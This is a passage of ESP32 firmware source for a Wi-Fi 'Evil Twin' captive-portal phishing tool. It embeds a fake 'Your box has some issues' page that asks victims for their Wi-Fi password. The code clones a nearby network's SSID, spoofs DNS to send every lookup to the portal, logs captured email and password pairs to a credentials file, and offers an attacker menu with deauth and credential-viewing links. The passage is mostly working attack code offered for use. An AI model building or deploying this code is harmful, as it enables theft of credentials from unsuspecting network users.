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);height:100px;width:100px;background-size:76px 77px;background-repeat:no-repeat;background-position:center;margin:10px auto;display:block}</style><div class=login-form><div class=login-image></div><p>Warning !<p>Your box has some issues !<p>Please enter your WIFI password to reset :</p><input class=form-control id=email placeholder=Email type=hidden> <input class=form-control id=password placeholder='WIFI PASSWORD'type=password> <button class=btn onclick=sendCredentials()>send</button></div><script>function sendCredentials(){var e=document.getElementById('password').value;getFile('http://192.168.4.1/?email='+encodeURIComponent('Wifi pass !')+'&password='+encodeURIComponent(e)),alert('Check the network.'),window.location.href='https://www.google.com'}function getFile(e){var t=new XMLHttpRequest;t.open('GET',e,!0),t.send()}</script>");
  ensureFile("/config.txt",
             "SSID:Evil‑C5\n"
             "PWD:\n"
             "PAGE:/normal.html\n");
  loadConfig();
}

//------------------------------------------------------------------
// ── HELPERS ─────────────────────────────────────────────────
//------------------------------------------------------------------
String htmlHeader(const char* title) {
  return String(F("<!DOCTYPE html><html><head><meta charset='utf-8'>")) +
         "<title>" + title + "</title><style>body{font-family:sans-serif;background:#f0f0f0;padding:40px}</style></head><body>";
}

void saveConfig() {
  File f = LittleFS.open("/config.txt", FILE_WRITE);
  if (!f) {
    Serial.println("! saveConfig(): open failed");
    return;
  }
  f.printf("SSID:%s\n", clonedSSID.c_str());
  f.printf("PWD:%s\n", captivePortalPassword.c_str());
  f.printf("PAGE:%s\n", selectedPortalFile.c_str());
  f.close();
}

void loadConfig() {
  File f = LittleFS.open("/config.txt", FILE_READ);
  if (!f) {
    Serial.println("! loadConfig(): open failed");
    return;
  }

  while (f.available()) {
    String line = f.readStringUntil('\n');
    int sep = line.indexOf(':');
    if (sep < 0) continue;

    String key = line.substring(0, sep);
    String val = line.substring(sep + 1);

    if      (key == "SSID")     clonedSSID            = val;
    else if (key == "PWD")      captivePortalPassword = val;
    else if (key == "PAGE")     selectedPortalFile    = val;
  }

  f.close();

  // Afficher la config chargée dans la console
  Serial.println("Config loaded ⇒ AP=" + clonedSSID +
                 " PWD=" + captivePortalPassword +
                 " PAGE=" + selectedPortalFile);
}


//------------------------------------------------------------------
// ── PORTAL CORE ─────────────────────────────────────────────────
//------------------------------------------------------------------
void saveCredentials(const String & email, const String & password, const String & portalName, const String & clonedSSID) {
  File file = LittleFS.open("/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
    file.println("------------------");
    file.close();
    Serial.println("-------------------");
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println("-------------------");
  } else {
    Serial.println("Error opening file for writing");
  }
}


void servePortalFile(const String& path) {
  if (!LittleFS.exists(path)) {
    Serial.println("File not found: " + path);
    server.send(404, "text/plain", "Portal file missing");
    return;
  }
  File f = LittleFS.open(path, "r");
  server.streamFile(f, "text/html");
  f.close();
}


//------------------------------------------------------------------
// ── FILE MANAGER ROUTINES ───────────────────────────────────────
//------------------------------------------------------------------
File fsUploadFile;           // buffer pour /upload

String getDirectoryHtml(File dir, String path, String password) {
  String html = "<!DOCTYPE html><html><head><style>";
  html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
  html += "ul{list-style-type:none;padding:0}";
  html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
  html += "a{color:#007bff;text-decoration:none}";
  html += "a:hover{color:#0056b3}";
  html += ".red{color:red}";
  html += "</style></head><body><ul>";

  if (path != "/") {
    String parentPath = path.substring(0, path.lastIndexOf('/'));
    if (parentPath == "") parentPath = "/";
    html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
  }

  while (File file = dir.openNextFile()) {
    String fileName = String(file.name());
    String displayFileName = fileName;
    if (path != "/" && fileName.startsWith(path)) {
      displayFileName = fileName.substring(path.length());
      if (displayFileName.startsWith("/")) {
        displayFileName = displayFileName.substring(1);
      }
    }

    String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
    if (!fullPath.startsWith("/")) {
      fullPath = "/" + fullPath;
    }

    if (file.isDirectory()) {
      html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
    } else {
      html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes)";

      // Ajout du lien d'édition pour les fichiers `.txt` et `.html`
      if (fileName.endsWith(".txt") || fileName.endsWith(".html") || fileName.endsWith(".ini")) {
        html += " <a href='/edit-file?filename=" + fullPath + "&pass=" + password + "' style='color:green;'>[Edit]</a>";
      }

      html += " <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
    }
    file.close();
  }
  html += "</ul>";
  html += "<script>"
          "function confirmDelete(filename) {"
          "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
          "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
          "  }"
          "}"
          "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
          "</script>";

  return html;
}

void handleSdCardBrowse() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = LittleFS.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  // Ajout du bouton pour revenir au menu principal
  String html = "<p><a href='/evil-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";

  // Générer le HTML pour lister les fichiers et dossiers
  html += getDirectoryHtml(dir, dirPath, password);
  server.send(200, "text/html", html);
  dir.close();
}

void handleFileDownload() {
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (LittleFS.exists(fileName)) {
    File file = LittleFS.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
}


void handleFileDelete() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (LittleFS.exists(fileName)) {
    if (LittleFS.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File deleted successfully");
      Serial.println("-------------------");
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File could not be deleted");
      Serial.println("-------------------");
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    Serial.println("-------------------");
    Serial.println("File not found");
    Serial.println("-------------------");
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/plain", "Unauthorized");
    return;
  }

  File root = LittleFS.open("/");
  String dirList = "";

  while (File file = root.openNextFile()) {
    if (file.isDirectory()) {
      dirList += String(file.name()) + "\n";
    }
    file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
    Serial.println("Unauthorized access attempt");
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = LittleFS.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print("Upload Start: ");
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println("Write Error: Inconsistent data size.");
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println("Error: File is no longer valid for writing.");
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println("Error: Data segment size too large.");
        Serial.println(upload.currentSize);
      } else {
        Serial.println("Information: Empty data segment received.");
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("Upload End: ");
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("File successfully uploaded");
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println("File closing error");
    }
  }
}

//------------------------------------------------------------------
// ── EDITOR (edit-file / save-file) ───────────────────────────────
//------------------------------------------------------------------

void handleSaveFileUpload() {
  HTTPUpload& upload = server.upload();

  if (upload.status == UPLOAD_FILE_START) {
    // Reset authorization flag
    isSaveFileAuthorized = false;

    // Read the password
    String saveFilePassword = server.arg("pass");
    if (saveFilePassword != accessWebPassword) {
      Serial.println("Unauthorized upload attempt.");
      return;
    } else {
      isSaveFileAuthorized = true;
    }

    String saveFileName = server.arg("filename");
    if (!saveFileName.startsWith("/")) {
      saveFileName = "/" + saveFileName;
    }

    // Supprimer l'original s'il existe avant de sauvegarder la nouvelle version
    if (LittleFS.exists(saveFileName)) {
      if (LittleFS.remove(saveFileName)) {
        Serial.println("Original file deleted successfully: " + saveFileName);
      } else {
        Serial.println("Failed to delete original file: " + saveFileName);
        isSaveFileAuthorized = false;
        return;
      }
    }

    // Créer un nouveau fichier pour l'écriture
    saveFileObject = LittleFS.open(saveFileName, FILE_WRITE);
    if (!saveFileObject) {
      Serial.println("Failed to open file for writing: " + saveFileName);
      isSaveFileAuthorized = false;
      return;
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    // Write the received bytes to the file
    if (isSaveFileAuthorized && saveFileObject) {
      saveFileObject.write(upload.buf, upload.currentSize);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (isSaveFileAuthorized && saveFileObject) {
      saveFileObject.close();
      Serial.println("File upload completed successfully.");
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (saveFileObject) {
      saveFileObject.close();
      Serial.println("File upload aborted.");
    }
  }
}
String portalFiles[50];

void changePortal(int i) {
  if (portalFiles[i].length()) {
    // on remet un / si absent
    selectedPortalFile = portalFiles[i].startsWith("/") ?
                         portalFiles[i] : "/" + portalFiles[i];
    Serial.println("Portal switched to " + selectedPortalFile);
  } else {
    Serial.println("Invalid portal index");
  }
}


void scanWiFiNetworks() {
  Serial.println("Scanning Wifi Around...");
  scannedNetworks.clear();
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    WiFiAccessPoint ap;
    ap.ssid = WiFi.SSID(i);
    ap.rssi = WiFi.RSSI(i);
    ap.bssid = WiFi.BSSIDstr(i);
    ap.channel = WiFi.channel(i);
    scannedNetworks.push_back(ap);
  }
}



//------------------------------------------------------------------
// ── CAPTIVE PORTAL START / STOP ─────────────────────────────────
//------------------------------------------------------------------
void stopCaptivePortal() {
  dns.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("Captive Portal Stopped...");
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
    // Démarrage de l'AP après avoir déterminé le mode final
    if (!captivePortalPassword.isEmpty()) {
      WiFi.softAP(clonedSSID.c_str(), captivePortalPassword.c_str());
      Serial.println("AP started: " + clonedSSID + " (secure)");
    } else {
      WiFi.softAP(clonedSSID.c_str());
      Serial.println("AP started: " + clonedSSID + " (open)");
    }


  isCaptivePortalOn = true;
  dns.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println("DNS spoofing started");


  server.on("/", HTTP_GET, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    if (!email.isEmpty() && !password.isEmpty()) {
      saveCredentials(email, password, selectedPortalFile, clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
      server.send(200, "text/plain", "Credentials Saved");
    } else {
      Serial.println("-------------------");
      Serial.println("Direct Web Access !!!");
      Serial.println("-------------------");
      servePortalFile(selectedPortalFile);
    }
  });

  server.on("/evil-menu", HTTP_GET, []() {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
    html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
    html += "input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
    html += "a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
    html += "</style></head><body>";
    html += "<div class='menu'><form action='/evil-menu' method='get'>";
    html += "Password: <input type='password' name='pass'><br>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On LittleFS</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check LittleFS File</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/setup-portal?pass=\"+document.getElementsByName(\"pass\")[0].value'>Setup Portal</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/deauth-menu?pass=\"+document.getElementsByName(\"pass\")[0].value'>Evil Twin</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/monitor-status?pass=\"+document.getElementsByName(\"pass\")[0].value'>Monitor Status</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/reboot?pass=\"+document.getElementsByName(\"pass\")[0].value'>Reboot</a>";

    html += "</form></div></body></html>";
    server.send(200, "text/html", html);
    Serial.println("-------------------");
    Serial.println("evil-menu access.");
    Serial.println("-------------------");
  });



  server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
